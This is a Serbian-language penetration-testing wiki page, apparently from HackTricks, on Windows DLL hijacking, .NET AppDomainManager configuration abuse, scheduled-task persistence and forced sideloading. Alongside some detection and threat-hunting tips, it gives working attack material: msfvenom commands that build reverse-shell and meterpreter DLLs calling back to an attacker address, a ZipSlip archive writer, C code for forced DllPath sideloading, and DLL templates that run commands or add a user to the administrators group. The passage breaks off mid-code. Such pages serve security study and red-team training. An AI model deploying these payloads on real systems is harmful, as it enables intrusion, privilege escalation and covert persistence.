# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulisanje pouzdanom aplikacijom kako bi učitala zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika, kao što su **DLL Spoofing, Injection i Side-Loading**. Uglavnom se koristi za izvršavanje koda i postizanje postojanosti, a ređe za eskalaciju privilegija. Iako je ovde naglasak na eskalaciji, način otmice ostaje isti bez obzira na cilj.

### Uobičajene tehnike

Za DLL hijacking se koristi nekoliko metoda, a njihova efikasnost zavisi od strategije aplikacije za učitavanje DLL-ova:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zamena originalnog DLL-a zlonamernim, uz mogućnost korišćenja DLL Proxying-a kako bi se sačuvala funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u putanju pretrage ispred legitimnog i iskorišćavanje obrasca pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a koji će aplikacija učitati, misleći da je reč o nepostojećem, ali neophodnom DLL-u.
4. **DLL Redirection**: Izmena parametara pretrage kao što je `%PATH%` ili datoteka `.exe.manifest` / `.exe.local` kako bi se aplikacija usmerila ka zlonamernom DLL-u.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernim u direktorijumu WinSxS; ova metoda se često povezuje sa DLL side-loading-om.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika, zajedno sa kopiranom aplikacijom, što podseća na tehnike Binary Proxy Execution.

Aplikacija može da implementira i **sopstveni DLL loader**. Privilegovani proces može da izlista poddirektorijum kao što su `Libraries` ili `Plugins` i prosledi odabrani DLL pomoćnom procesu, nezavisno od uobičajenog redosleda pretrage DLL-ova u Windows-u. Ako drugi nalog može da kreira datoteke u tom konkretnom direktorijumu, tretirajte to kao trag za dalju proveru: utvrdite identitet procesa, efektivne ACL-ove direktorijuma, pravilo za izbor datoteke i dostupnu operaciju učitavanja. To što je direktorijum pored izvršne datoteke upisiv ne dokazuje da proces iz njega učitava DLL-ove.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasično DLL sideloading nije jedini način da se pouzdan proces **.NET Framework** наведе да учита код нападача. Ако је циљна извршна датотека **managed** апликација, CLR такође проверава **конфигурациону датотеку апликације** чији је назив изведен из назива извршне датотеке (на пример, `Setup.exe.config`). У тој датотеци може да се дефинише прилагођени **AppDomainManager**. Ако конфигурација упућује на склоп под контролом нападача, смештен поред EXE датотеке, CLR га учитава **пре уобичајеног пута извршавања апликације** и покреће унутар поузданог процеса.<sup>[[24]](#references)</sup>

Према Microsoft-овој шеми конфигурације за .NET Framework, и `<appDomainManagerAssembly>` и `<appDomainManagerType>` морају бити присутни да би се користио прилагођени менаџер.<sup>[[16]](#references)[[17]](#references)</sup>

Минимална конфигурација:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimalni menadžer:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktične napomene:
- Ovo je tradecraft specifičan za **.NET Framework**. Zasniva se na parsiranju CLR konfiguracije, a ne na redosledu pretrage Win32 DLL-ova.
- Host mora zaista biti **managed EXE**. Brza provera: `sigcheck -m target.exe`, `corflags target.exe` ili provera **CLR Runtime Header** u PE metapodacima.
- Naziv konfiguracione datoteke mora se tačno podudarati sa nazivom izvršne datoteke (`<binary>.config`) i obično se nalazi **pored EXE datoteke**.
- Ovo je korisno sa **potpisanim binarnim datotekama Microsoft-a/proizvođača**, jer pouzdani EXE ostaje neizmenjen, dok se zlonamerni managed assembly izvršava u istom procesu.
- Ako već imate direktorijum za instalaciju/ažuriranje u koji možete da upisujete, AppDomainManager hijacking može se koristiti kao **prva faza**, a zatim mogu slediti klasični DLL sideloading ili reflective loading u kasnijim fazama.

### AppDomainManager kao downloader + pokretač scheduled task-a

Praktičan obrazac upada je kombinovanje pouzdanog managed EXE-a sa zlonamernim `*.config` fajlom i zlonamernom AppDomainManager DLL datotekom koja služi samo kao **mali bootstrapper**:<sup>[[25]](#references)</sup>

1. Korisnik pokreće potpisani .NET instalacioni program ili alatku za ažuriranje sa uverljive lokacije, kao što je `%USERPROFILE%\Downloads`.
2. Pridružena konfiguracija navodi CLR da učita napadačev assembly **pre nego što započne logika legitimne aplikacije**.
3. Zlonamerni manager primenjuje **path gate** (na primer, nastavlja samo ako se host EXE pokreće iz `Downloads`, a drugoj fazi dozvoljava pokretanje samo iz `%LOCALAPPDATA%`).
4. Ako provera prođe, preuzima stvarni payload na lokaciju u koju korisnik može da upisuje, kao što je `%LOCALAPPDATA%\PerfWatson2.exe`, i uspostavlja persistence pomoću scheduled task-a.

Zašto je ova varijanta važna:
- Potpisani host EXE ostaje neizmenjen, pa provera koja hash-uje samo glavni binarni fajl može da propusti kompromitaciju.
- Jednostavna **path-based anti-analysis** tehnika je česta: premeštanje ZIP/EXE/DLL trija na Desktop, Temp ili putanju sandbox-a može namerno da prekine lanac.
- AppDomainManager DLL prve faze može da ostane sićušan i neupadljiv, dok se stvarni implant preuzima kasnije.

Minimalni primer persistence-a koji se često viđa u ovom obrascu:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Napomene:
- ` /rl highest` znači **najviši nivo dostupan** tom korisniku/sesiji; samo po sebi ne garantuje eskalaciju do SYSTEM-a.
- Ovu tehniku je često bolje klasifikovati kao **izvršavanje/persistenciju zloupotrebom .NET konfiguracije** nego kao klasično hijacking pretrage direktorijuma za nedostajućim DLL-ovima, iako operateri često kombinuju oba pristupa.

Indikatori za detekciju:
- Potpisani .NET izvršni fajlovi pokrenuti iz putanja za raspakivanje ZIP arhiva, `Downloads`, `%TEMP%` ili drugih direktorijuma u koje korisnik može da upisuje, uz `<exe>.config` **u istoj fascikli**.
- Novi zakazani zadaci čija radnja upućuje na `%LOCALAPPDATA%`, `%APPDATA%` ili `Downloads`, a čiji nazivi oponašaju programe za ažuriranje pregledača ili dobavljača.
- Kratkotrajni upravljani bootstrap procesi koji odmah preuzimaju drugi EXE, a zatim pokreću `schtasks.exe`.
- Uzorci koji se rano zatvaraju ako putanja do izvršnog fajla ne odgovara očekivanom direktorijumu korisničkog profila.

### Hijacking postojećeg zakazanog zadatka radi ponovnog pokretanja sideload lanca

Za održavanje prisustva nemojte tražiti samo **kreiranje novog zadatka**. Neke grupe napadača čekaju da legitimni instalacioni program kreira **uobičajeni zadatak za ažuriranje**, a zatim **prepravljaju radnju zadatka** tako da postojeći naziv, autor i okidač ostanu poznati braniocima.

Ponovljiv postupak:
1. Instalirajte/pokrenite legitimni softver i utvrdite koji zadatak obično kreira.
2. Izvezite XML zadatka i zabeležite trenutne vrednosti `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zamenite samo radnju tako da zadatak pokrene vaš **pouzdani host EXE** iz privremenog direktorijuma u koji korisnik može da upisuje; taj EXE zatim side-load-uje ili učitava stvarni payload putem AppDomain-a.
4. Ponovo registrujte zadatak pod istim nazivom umesto da kreirate novi, očigledan artefakt za održavanje prisustva.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Zašto je prikrivenije:
- Naziv zadatka i dalje može da deluje legitimno (na primer, kao program za ažuriranje nekog proizvođača).
- Pokreće ga servis **Task Scheduler**, pa provera roditeljskog procesa i njegovih predaka često prikazuje očekivani lanac pokretanja zadatka umesto `explorer.exe`.
- DFIR timovi koji traže samo **nove nazive zadataka** mogu da previde zadatak čija je registracija već postojala, ali čija radnja sada upućuje na `%LOCALAPPDATA%`, `%APPDATA%` ili drugu putanju pod kontrolom napadača.

Brze smernice za potragu:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Uporedite XML datoteke u `C:\Windows\System32\Tasks\*` i metapodatke u `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` sa osnovnim stanjem.
- Generišite upozorenje kada se **zadatak za ažuriranje koji izgleda kao da pripada proizvođaču** pokreće iz **direktorijuma u koje korisnik može da upisuje** ili pokreće .NET EXE sa datotekom `*.config` u istom direktorijumu.

> [!TIP]
> Za lanac koraka koji kombinuje HTML staging, AES-CTR konfiguracije i .NET implantate sa DLL sideloading-om, pogledajte tok rada u nastavku.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Pronalaženje nedostajućih DLL-ova

Najčešći način da pronađete nedostajuće DLL-ove u sistemu jeste da pokrenete [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals-a i **podesite sledeća 2 filtera**:

![Uobičajene tehnike - Pronalaženje nedostajućih DLL-ova: Najčešći način da pronađete nedostajuće DLL-ove u sistemu jeste da pokrenete procmon iz sysinternals-a i podesite sledeća 2 filtera](<../../../images/image (961).png>)

![Uobičajene tehnike - Pronalaženje nedostajućih DLL-ova: Najčešći način da pronađete nedostajuće DLL-ove u sistemu jeste da pokrenete procmon iz sysinternals-a i podesite sledeća 2 filtera](<../../../images/image (230).png>)

i prikažete samo **File System Activity**:

![Uobičajene tehnike - Pronalaženje nedostajućih DLL-ova: i prikažite samo File System Activity](<../../../images/image (153).png>)

Ako tražite **nedostajuće DLL-ove uopšte**, ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **nedostajući DLL unutar određenog izvršnog fajla**, podesite još jedan filter, na primer **"Process Name" "contains" `<exec name>`**, pokrenite ga i zaustavite beleženje događaja.<sup>[[9]](#references)</sup>

## Iskorišćavanje nedostajućih DLL-ova

Da biste eskalirali privilegije, potražite **DLL koji privilegovani proces pokušava da učita** sa lokacije u koju možete da upisujete. Do ovoga može doći kada kontrolišete direktorijum koji se pretražuje pre direktorijuma sa legitimnim DLL-om ili kada traženi DLL ne postoji, a možete da upisujete u neki od direktorijuma koji se pretražuju.

### Redosled pretrage DLL-ova

**U** [**Microsoft dokumentaciji**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete da saznate kako se DLL-ovi učitavaju.**

**Windows aplikacije** traže DLL-ove po nizu **unapred definisanih putanja za pretragu**, prateći određeni redosled. Do DLL hijackinga dolazi kada se zlonamerni DLL strateški postavi u jedan od ovih direktorijuma, tako da se učita pre legitimnog DLL-a. Jedan od načina da se ovo spreči jeste da aplikacija koristi apsolutne putanje za DLL-ove koje su joj potrebne.

U nastavku možete videti **redosled pretrage DLL-ova na 32-bitnim** sistemima:

1. Direktorijum iz kog je aplikacija učitana.
2. Sistemski direktorijum. Putanju do njega dobijate pomoću funkcije [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya).(_C:\Windows\System32_)
3. 16-bitni sistemski direktorijum. Ne postoji funkcija koja vraća putanju do ovog direktorijuma, ali se on pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Putanju do njega dobijate pomoću funkcije [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya).
   1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi navedeni u promenljivoj okruženja PATH. Imajte u vidu da ovo ne uključuje putanju za konkretnu aplikaciju navedenu u registracionom ključu **App Paths**. Ključ **App Paths** se ne koristi pri izračunavanju putanje za pretragu DLL-ova.

Ovo je podrazumevani redosled pretrage kada je **SafeDllSearchMode** omogućen. Kada je on onemogućen, trenutni direktorijum se pomera na drugo mesto. Da biste onemogućili ovu funkciju, napravite vrednost registra **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućena).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji funkcija **LoadLibraryEx** učitava.

DLL se može učitati i pomoću apsolutne putanje, a ne naziva. U tom slučaju Windows traži sam DLL samo na toj putanji; zavisnosti navedene po nazivu i dalje prate odgovarajući redosled pretrage.

Postoje i drugi načini za izmenu redosleda pretrage, ali ih ovde neću objašnjavati.

### Ulančavanje arbitrary file write ranjivosti sa hijacking-om nedostajućeg DLL-a

**Srodna tehnika:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Pomoću filtera u **ProcMon** (`Process Name` = ciljni EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) prikupite nazive DLL-ova koje proces traži, ali ne može da pronađe.<sup>[[14]](#references)</sup>
2. Ako se binarni fajl pokreće **po rasporedu/kao servis**, DLL sa jednim od tih naziva postavljen u **direktorijum aplikacije** (prva stavka u redosledu pretrage) učitaće se pri sledećem pokretanju. U jednom slučaju sa .NET skenerom, proces je tražio `hostfxr.dll` u `C:\samples\app\` pre nego što je učitao pravu kopiju iz `C:\Program Files\dotnet\fxr\...`.
3. Napravite payload DLL (npr. reverse shell) sa bilo kojim export-om: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ako je vaš primitive **arbitrary write u stilu ZipSlip-a**, napravite ZIP čiji unos izlazi iz direktorijuma za raspakivanje, tako da DLL završi u direktorijumu aplikacije:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Isporučite arhivu u nadgledani inbox/share; kada zakazani zadatak ponovo pokrene proces, on učitava zlonamerni DLL i izvršava vaš kod kao nalog servisa.

### Prinudni sideloading putem RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način za deterministički uticaj na putanju pretrage DLL-ova novokreiranog procesa jeste da se postavi polje DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa pomoću nativnih API-ja iz ntdll-a. Ako ovde navedete direktorijum kojim upravlja napadač, ciljni proces koji razrešava uvezeni DLL po imenu (bez apsolutne putanje i bez korišćenja bezbednih zastavica za učitavanje) može se naterati da učita zlonamerni DLL iz tog direktorijuma.

Osnovna ideja
- Napravite parametre procesa pomoću RtlCreateProcessParametersEx i navedite prilagođeni DllPath koji pokazuje na fasciklu kojom upravljate (npr. direktorijum u kom se nalazi vaš dropper/unpacker).
- Kreirajte proces pomoću RtlCreateUserProcess. Kada ciljni binarni fajl razreši DLL po imenu, loader će tokom razrešavanja proveriti navedeni DllPath, što omogućava pouzdan sideloading čak i kada se zlonamerni DLL ne nalazi u istom direktorijumu kao ciljni EXE.

Napomene/ograničenja
- Ovo utiče na proces dete koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na trenutni proces.
- Ciljni proces mora da uvozi DLL po imenu ili da ga učita pomoću LoadLibrary (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodirane apsolutne putanje ne mogu se oteti. Prosleđeni export-i i SxS mogu promeniti redosled prioriteta.

Minimalni primer u C-u (ntdll, wide strings, pojednostavljeno rukovanje greškama):

<details>
<summary>Potpun primer u C-u: prinudni DLL sideloading putem RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Primer operativne upotrebe
- Postavite zlonamerni xmllite.dll (koji eksportuje potrebne funkcije ili prosleđuje pozive pravom DLL-u) u direktorijum DllPath.
- Pokrenite potpisani binarni fajl za koji se zna da pomoću gorenavedene tehnike traži xmllite.dll po imenu. Loader razrešava import preko navedenog DllPath-a i učitava vaš DLL sa strane.

Primećeno je da se ova tehnika koristi u stvarnim napadima za pokretanje višestepenih lanaca sideloading-a: početni pokretač izbacuje pomoćni DLL, koji zatim pokreće Microsoft-ovim potpisom potpisan, podložan hijack-ovanju binarni fajl sa prilagođenim DllPath-om, čime se nameće učitavanje napadačevog DLL-a iz direktorijuma za pripremu.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking preko `.exe.config`

Kod ciljeva koji koriste **.NET Framework**, sideloading može da se izvrši **pre `Main()`** bez menjanja memorije, zloupotrebom susedne datoteke **`.exe.config`** aplikacije. Umesto oslanjanja samo na Win32 redosled pretrage DLL-ova, napadač postavlja legitimni .NET EXE pored zlonamernog konfiguracionog fajla i jednog ili više sklopova pod kontrolom napadača.

Kako lanac funkcioniše:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE se pokreće, a **CLR čita `<exe>.config`**.
2. Konfiguracija postavlja **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`** tako da runtime instancira `AppDomainManager` pod kontrolom napadača.
3. Zlonamerni manager dobija mogućnost **izvršavanja pre `Main()`** unutar pouzdanog host procesa.
4. Ista konfiguracija može da primora CLR da prvo razrešava lokalne sklopove (na primer `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) i da oslabi validaciju/runtime telemetriju bez inline patching-a.

Obrazac nalik kampanji (tačno ugnježđivanje može da varira u zavisnosti od direktive / verzije CLR-a):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Zašto je ovo korisno:
- **`<probing privatePath="."/>`** zadržava razrešavanje assembly-ja u direktorijumu aplikacije, čime se fascikla pretvara u predvidljivu površinu za sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** preusmeravaju izvršavanje na kod napadača tokom inicijalizacije CLR-a, pre nego što se pokrene legitimna logika aplikacije.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** može omogućiti aplikaciji sa punim poverenjem da učita nepotpisane ili izmenjene assembly-je bez greške pri validaciji strong-name potpisa.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** sprečava preusmeravanja publisher-policy-ja na novije assembly-je.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** omogućava predvidljiviji izbor runtime-a.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** je posebno zanimljiv jer **CLR iz konfiguracije isključuje sopstvenu vidljivost u ETW-u**, umesto da implant u memoriji menja `EtwEventWrite`.

Operativni obrazac uočen u novijim kampanjama:
- Faza 1 postavlja `setup.exe`, `setup.exe.config` i lokalne assembly-je.
- Faza 2 ih kopira u uverljivu fasciklu za **AppData ažuriranja**, preimenuje host u nešto poput `update.exe` i ponovo ga pokreće putem **zakazanog zadatka**.
- Faza 3 proverava kontekst izvršavanja (na primer, očekivani nadređeni proces `svchost.exe` koji pokreće Task Scheduler) pre učitavanja konačnog RAT DLL-a/eksporta.

Ideje za lov na pretnje:
- Potpisani ili na drugi način legitimni **.NET izvršni fajlovi** koji se pokreću uz sumnjive susedne fajlove **`.config`** na lokacijama u koje korisnik može da upisuje.
- Fajlovi `.config` koji sadrže **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ili **`etwEnable enabled="false"`**.
- Zakazani zadaci koji ponovo pokreću preimenovane binarne fajlove za ažuriranje iz fascikli **`%LOCALAPPDATA%`** ili fascikli aplikacije kao što je `\bin\update\`.
- Lanci nadređenih/podređenih procesa u kojima zakazani zadatak pokreće pouzdani .NET host koji odmah učitava assembly-je koji nisu od proizvođača, iz sopstvenog direktorijuma.

#### Izuzeci od redosleda pretrage DLL-ova prema Windows dokumentaciji

Windows dokumentacija navodi određene izuzetke od standardnog redosleda pretrage DLL-ova:

- Kada se naiđe na **DLL čiji se naziv poklapa sa nazivom DLL-a koji je već učitan u memoriju**, sistem zaobilazi uobičajenu pretragu. Umesto toga, proverava da li postoje redirekcija i manifest, a zatim, ako ih nema, koristi DLL koji je već u memoriji. **U ovom slučaju sistem ne pretražuje DLL**.
- Ako je DLL prepoznat kao **poznati DLL** za aktuelnu verziju Windows-a, sistem će koristiti svoju verziju poznatog DLL-a, zajedno sa svim DLL-ovima od kojih zavisi, **preskačući pretragu**. Ključ registratora **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih poznatih DLL-ova.
- Ako **DLL ima zavisnosti**, pretraga tih zavisnih DLL-ova obavlja se kao da su navedeni samo njihovi **nazivi modula**, bez obzira na to da li je početni DLL pronađen preko pune putanje.

### Eskalacija privilegija

**Uslovi**:

- Pronađite proces koji radi ili će raditi sa **drugačijim privilegijama** (horizontalno ili lateralno kretanje) i kojem **nedostaje DLL**.
- Uverite se da imate **pristup za pisanje** u bilo koji **direktorijum** u kojem će se **tražiti DLL**. To može biti direktorijum izvršnog fajla ili direktorijum unutar sistemske putanje.

Ovi preduslovi su podrazumevano retki: privilegovanim izvršnim fajlovima obično ne nedostaju zavisni DLL-ovi, a standardni korisnici uglavnom ne mogu da pišu u direktorijume sistemske putanje za pretragu. Pogrešno konfigurisana okruženja i dalje mogu izložiti oba uslova.\
Ako su uslovi ispunjeni, pogledajte projekat [UACME](https://github.com/hfiref0x/UACME). Iako mu je glavni cilj zaobilaženje UAC-a, sadrži PoC-ove za DLL hijacking za određene verzije Windows-a, koji se često mogu prilagoditi direktorijumu sa dozvolom za pisanje koji ste pronašli.

Imajte na umu da **dozvole u fascikli možete proveriti** ovako:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

I **proverite dozvole svih fascikli navedenih u PATH-u**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Možete i proveriti uvezene funkcije izvršne datoteke i izvezene funkcije DLL-a pomoću:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Za kompletan vodič o tome kako **zloupotrebiti DLL Hijacking za eskalaciju privilegija** uz dozvole za upis u fasciklu **System Path**, pogledajte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatizovani alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)će proveriti da li imate dozvole za upis u neku fasciklu unutar system PATH-a.\
Drugi zanimljivi automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit funkcije**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Primer

Ako pronađete scenario koji se može iskoristiti, jedna od najvažnijih stvari za uspešno iskorišćavanje jeste da **napravite dll koji exportuje bar sve funkcije koje će izvršna datoteka uvesti iz njega**. U svakom slučaju, imajte na umu da je DLL Hijacking koristan za [**eskalaciju sa Medium Integrity nivoa na High (zaobilaženjem UAC-a)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili sa[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Primer **kako da napravite ispravan dll** možete pronaći u ovoj studiji o DLL hijacking-u, usmerenoj na izvršavanje preko DLL hijacking-a: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Pored toga, u **naredno**m odeljku možete pronaći neke **osnovne dll kodove** koji mogu biti korisni kao **šabloni** ili za pravljenje **dll-a sa exportovanim funkcijama koje nisu obavezne**.

## **Kreiranje i kompajliranje DLL-ova**

### **DLL Proxifying**

U osnovi, **DLL proxy** je DLL koji može da **izvrši vaš zlonamerni kod prilikom učitavanja**, ali i da **izloži** i **funkcioniše** onako kako se **očekuje**, tako što **prosleđuje sve pozive stvarnoj biblioteci**.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete **navesti izvršnu datoteku i izabrati biblioteku** koju želite da proxifikujete, pa **generisati proxifikovani dll**, ili **navesti DLL** i **generisati proxifikovani dll**.

### **Meterpreter**

**Get rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Nabavite meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Kreirajte korisnika (x86, nisam video x64 verziju):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Vaš sopstveni

U mnogim slučajevima, DLL koji kompajlirate mora da **eksportuje svaku funkciju koju uvozi proces žrtve**. Ako nedostaje neki neophodan eksport, binarna datoteka ne može da ga razreši i exploit neće uspeti.

<details>
<summary>C DLL šablon (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
